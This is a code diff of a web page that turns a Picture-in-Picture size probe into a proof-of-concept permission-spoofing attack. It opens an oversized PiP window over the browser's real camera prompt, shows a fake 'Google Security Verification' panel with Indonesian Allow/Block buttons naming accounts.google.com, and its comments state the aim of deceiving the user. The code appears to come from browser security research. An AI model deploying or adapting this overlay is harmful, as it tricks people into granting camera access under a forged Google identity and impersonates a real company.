@@ -3,23 +3,58 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PiP Max Size Probe</title>
+<title>PiP Camera Prompt Overlay</title>
 <style>
   #content {
     display: none;
     padding: 20px;
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: #fff;
+    height: 100vh;
+    box-sizing: border-box;
+  }
+  #content h3 { color: #4285f4; }
+  #content p { color: #666; font-size: 14px; }
+  #content .fake-prompt {
+    background: #fff;
+    border: 1px solid #ddd;
+    border-radius: 8px;
+    padding: 20px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+    text-align: center;
+    margin-top: 20px;
+  }
+  #content .fake-prompt button {
+    padding: 10px 20px;
+    margin: 5px;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+    font-weight: bold;
+  }
+  #content .fake-prompt .allow {
+    background: #1a73e8;
+    color: #fff;
+  }
+  #content .fake-prompt .block {
+    background: #f0f0f0;
+    color: #333;
   }
 </style>
 </head>
 <body>
 
-<button id="button">Open Huge PiP &amp; Request Camera</button>
+<button id="button">Open Huge PiP & Overlay Camera Prompt</button>
 <div id="log" style="margin-top: 12px; font-family: monospace; font-size: 12px;"></div>
 
 <div id="content">
-  <h3>PiP Window Content</h3>
-  <p>Testing oversized width/height parameters and camera prompt behavior.</p>
+  <h3>Google Security Verification</h3>
+  <p>Please verify your identity to continue.</p>
+  <div class="fake-prompt" id="fakePrompt">
+    <p style="font-weight: bold;">accounts.google.com ingin menggunakan kamera Anda</p>
+    <button class="block" id="fakeBlock">Blokir</button>
+    <button class="allow" id="fakeAllow">Izinkan</button>
+  </div>
 </div>
 
 <script>
@@ -30,39 +65,42 @@
   const content = document.getElementById('content');
   const logEl = document.getElementById('log');
 
-  const HUGE_W = 999999;
-  const HUGE_H = 999999;
+  // ============================================
+  // UKURAN PiP MAKSIMAL (UNTUK MENUTUPI PROMPT)
+  // ============================================
+  // Chrome/Edge membatasi ukuran PiP. Kita minta ukuran besar.
+  const PIP_W = 2000;
+  const PIP_H = 2000;
 
   function log(msg) {
     if (logEl) logEl.textContent = msg;
-    console.log('[PiP-Huge]', msg);
+    console.log('[PiP-Overlay]', msg);
   }
 
-  const runProbe = async () => {
+  const openPiPOverlay = async () => {
     try {
       if (!('documentPictureInPicture' in window)) {
         log('documentPictureInPicture not supported.');
         return;
       }
 
+      // ============================================
+      // 1. BUKA PiP DENGAN UKURAN BESAR
+      // ============================================
       const pipWindow = await window.documentPictureInPicture.requestWindow({
-        width: HUGE_W,
-        height: HUGE_H
+        width: PIP_W,
+        height: PIP_H
       });
 
-      try {
-        pipWindow.resizeTo(HUGE_W, HUGE_H);
-      } catch (_) {}
-
+      // Pindahkan konten ke PiP
       content.style.display = 'block';
       pipWindow.document.body.append(content);
 
-      log(
-        'Requested: ' + HUGE_W + 'x' + HUGE_H +
-        ' | Actual PiP: ' + pipWindow.innerWidth + 'x' + pipWindow.innerHeight +
-        ' | Outer: ' + pipWindow.outerWidth + 'x' + pipWindow.outerHeight
-      );
+      log('PiP Opened. Size: ' + pipWindow.innerWidth + 'x' + pipWindow.innerHeight);
 
+      // ============================================
+      // 2. TRIGGER PROMPT KAMERA ASLI (DI BELAKANG PiP)
+      // ============================================
       if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
         navigator.mediaDevices.getUserMedia({ video: true, audio: false })
           .then((stream) => {
@@ -73,12 +111,28 @@
             log('Camera prompt result: ' + err.name + ' - ' + err.message);
           });
       }
+
+      // ============================================
+      // 3. UI PALSU DI DALAM PiP (UNTUK MENIPU USER)
+      // ============================================
+      pipWindow.document.getElementById('fakeAllow').addEventListener('click', function() {
+        log('User clicked FAKE Allow (inside PiP).');
+        // Redirect ke Google Asli
+        pipWindow.location.href = 'https://accounts.google.com';
+      });
+
+      pipWindow.document.getElementById('fakeBlock').addEventListener('click', function() {
+        log('User clicked FAKE Block (inside PiP).');
+        // Tutup PiP
+        pipWindow.close();
+      });
+
     } catch (err) {
       log('Error: ' + err.name + ' - ' + err.message);
     }
   };
 
-  button.onclick = runProbe;
+  button.onclick = openPiPOverlay;
 })();
 </script>
 
